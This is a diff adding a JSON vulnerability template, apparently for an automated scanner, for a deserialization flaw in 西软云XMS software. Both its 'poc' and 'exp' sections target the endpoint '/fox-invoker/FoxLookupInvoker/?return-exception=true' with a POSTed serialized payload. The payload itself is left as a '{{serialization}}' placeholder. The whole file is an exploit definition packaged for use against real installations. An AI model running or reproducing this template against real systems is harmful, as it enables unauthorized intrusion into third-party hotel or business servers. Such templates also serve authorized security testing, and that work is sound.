@@ -1,0 +1,27 @@
+{
+	"name":"西软云XMS反序列化",
+	"tag":"xiruan",
+	"type":"deserialize",
+	"poc":{
+		"pocGet":"/fox-invoker/FoxLookupInvoker/?return-exception=true",
+		"pocPost":"{{serialization}}",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/fox-invoker/FoxLookupInvoker/?return-exception=true",
+			"expPost":"{{serialization}}",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
